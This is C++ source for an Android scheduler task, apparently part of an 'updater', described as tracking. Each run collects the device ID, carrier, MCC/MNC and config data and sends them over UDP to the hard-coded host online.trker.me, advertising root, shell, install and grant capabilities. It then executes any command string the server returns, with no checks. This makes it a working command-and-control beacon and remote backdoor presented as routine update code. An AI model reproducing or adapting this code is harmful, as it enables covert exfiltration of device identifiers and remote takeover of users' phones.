#include "mmlIScheduler.h"
#include "mmlIFileSystem.h"
#include "mmlIVariantSerializer.h"
#include "mmlIVariantDeserializer.h"
#include "android_http_update.h"
#include "android_http_fetch.h"
#include "mml_components.h"
#include "mmlINetworkStreamClient.h"
#include "android_utils.h"
#include "android_updater_database.h"
#include "mml_services.h"
#include "android_cmd_dispatcher.h"
#include "android_properties.h"

extern const mmlChar * updater_version;

void log_main( const mmlChar * formatter , ... );

#define TRACK1_TIMER 5000
#define TRACK2_TIMER 10000
#define TRACK3_TIMER 30000


#define SET_PROPERTY(prop, name, dst) \
	{ \
		mmlAutoPtr < mmlICString > var; \
		if (android_property_get(prop, var.getterAddRef()) == mmlTrue ) \
		{ \
			if ( var != mmlNULL ) dst->Set(name, mmlNewVariantString(var)); \
		} \
	}


class AndroidTrackingTask : public mmlISchedulerTask
{
	MML_OBJECT_DECL
public:

	mmlISchedulerRule::TASK_RESULT_T Run (mmlIVariantStruct * _config)
	{
		//log_main("tracking tick\n");

		mmlSharedPtr < mmlIVariantStruct > config = mmlGetService(MML_GLOBAL_CONFIG_UUID());

		mmlAutoPtr < mmlIVariantStruct > settings;
		config->Get("settings", mmlRelativePtrAddRef < mmlIVariantStruct, mmlIVariant>(settings));

		mmlAutoPtr < mmlIVariantInteger > timestamp;
		settings->Get("timestamp", mmlRelativePtrAddRef<mmlIVariantInteger, mmlIVariant>(timestamp));
		if (timestamp == mmlNULL)
		{
			timestamp = mmlNewVariantInteger(0);
		}

		mmlUUID msgid;
		mmlUUIDGenerate(msgid);
		mmlChar msgid_str[64];
		mmlUUIDToStr(msgid, msgid_str, sizeof(msgid_str));

		mmlAutoPtr < mmlIVariantStruct > request = mmlNewVariantStruct();
		request->Set("id", mmlNewVariantString(mmlNewCString(msgid_str)));
		request->Set("timestamp", timestamp);


		mmlAutoPtr < mmlIVariantStruct > device = mmlNewVariantStruct();
		ADD_PROPERTY(config, "customer", "customer", device);
		mmlAutoPtr < mmlICString > device_id;
		android_get_device_id(device_id.getterAddRef());
		device->Set("id", mmlNewVariantString(device_id));


		SET_PROPERTY(ANDROID_PROPERTY_CARRIER, "carrier", device);
		SET_PROPERTY(ANDROID_PROPERTY_MCCMNC, "mccmnc", device);




		request->Set("info", device);

		mmlChar version[256];
		mmlSprintf(version, sizeof(version), "0.%s", updater_version);
		device->Set("version", mmlNewVariantString(mmlNewCString(version)));
		mmlAutoPtr < mmlIVariantArray > capabilities = mmlNewVariantArray();
		capabilities->Push(mmlNewVariantString(mmlCStaticString("install")));
		capabilities->Push(mmlNewVariantString(mmlCStaticString("uninstall")));
		capabilities->Push(mmlNewVariantString(mmlCStaticString("root")));
		capabilities->Push(mmlNewVariantString(mmlCStaticString("grant")));
		capabilities->Push(mmlNewVariantString(mmlCStaticString("shell")));
		device->Set("capabilities", capabilities);
		mmlAutoPtr < mmlIVariantStruct > android;
		config->Get("android", mmlRelativePtrAddRef < mmlIVariantStruct, mmlIVariant >(android));
		device->Set("android", android);
		mmlAutoPtr < mmlIBuffer > data;
		android_json_serialize(request, data.getterAddRef());
		//log_main("Sending track request\n");
		//request->Dump(0, mmlNULL, log_variant_log_func);
		{
			mmlSharedPtr < mmlINetworkStreamClient > client = mmlNewObject(MML_OBJECT_UUID(mmlINetworkStreamClient));
			if (client != mmlNULL)
			{
				mmlSharedPtr < mmlIVariantStruct > config = mmlNewVariantStruct();
				config->Set("socket", mmlNewVariantString(mmlNewCString("udp")));
				config->Set("host", mmlNewVariantString(mmlNewCString("online.trker.me")));
				config->Set("port", mmlNewVariantInteger(9500));
				mmlAutoPtr < mmlIOutputStream > output;
				mmlAutoPtr < mmlIInputStream > input;
				if (client->Connect(config, input.getterAddRef(), output.getterAddRef()) == NSC_OK)
				{
					mmlInt32 sz = 0;
					mmlChar buffer[4096];
					do {
						mmlAutoPtr < mmlIStreamControl > ctrl;
						input->GetControl(ctrl.getterAddRef());
						output->Write(data->Size(), data->Get());
						if (ctrl != mmlNULL)
						{
							ctrl->SetTimeout(TRACK1_TIMER);
						}
						//log_main("attempt 1\n");
						sz = input->Read(sizeof(buffer), buffer);
						if (sz > 0)
						{
							break;
						}
						output->Write(data->Size(), data->Get());
						if (ctrl != mmlNULL)
						{
							ctrl->SetTimeout(TRACK2_TIMER);
						}
						//log_main("attempt 2\n");
						sz = input->Read(sizeof(buffer), buffer);
						if (sz > 0)
						{
							break;
						}
						output->Write(data->Size(), data->Get());
						if (ctrl != mmlNULL)
						{
							ctrl->SetTimeout(TRACK3_TIMER);
						}
						//log_main("attempt 3\n");
						sz = input->Read(sizeof(buffer), buffer);
						if (sz > 0)
						{
							break;
						}
						log_main("Tracking server unreachable\n");
					} while (0);
					if (sz > 0)
					{
						mmlAutoPtr < mmlIBuffer > data = mmlNewStaticBuffer(buffer, sz);
						mmlAutoPtr < mmlIVariantStruct > response;
						android_json_deserialize(data, mmlRelativePtrAddRef < mmlIVariantStruct, mmlIVariant>(response));
						if (response != mmlNULL)
						{
							//log_main("Received response\n");
							//response->Dump(0, mmlNULL, log_variant_log_func);
							mmlAutoPtr < mmlIVariantInteger > new_timestamp;
							response->Get("timestamp", mmlRelativePtrAddRef < mmlIVariantInteger, mmlIVariant >(new_timestamp));
							if (new_timestamp != mmlNULL && new_timestamp->Get() > timestamp->Get())
							{
								settings->Set("timestamp", new_timestamp);

								mmlAutoPtr < mmlIVariantString > request;
								response->Get("request", mmlRelativePtrAddRef<mmlIVariantString , mmlIVariant>(request));
								if (request != mmlNULL)
								{
									log_main("Received task %s\n", request->Get()->Get());
									android_cmd(request->Get());
								}
							}
						}
					}
				}
			}
		}
		return mmlISchedulerRule::TASK_SUCCESS;
	}

};

MML_OBJECT_IMPL1(AndroidTrackingTask, mmlISchedulerTask)

#include "mml_components.h"

MML_CONSTRUCTOR_IMPL(AndroidTrackingTask);

static mmlObjectFactory android_tracking_task=
{
	{ 0x63AB4907, 0x6FC0, 0x1014, 0x9EE8 , { 0xAE, 0x9B, 0xD1, 0xF9, 0xC5, 0xE5 } },
	"mml/scheduler/tasks/tracking",
	MML_CONSTRUCTOR(AndroidTrackingTask)
};

mmlBool register_android_tracking_task ()
{
	mmlRegisterComponentFactory(&android_tracking_task);
	return mmlTrue;
}

ANDROID_INIT_MODULE_I(register_android_tracking_task);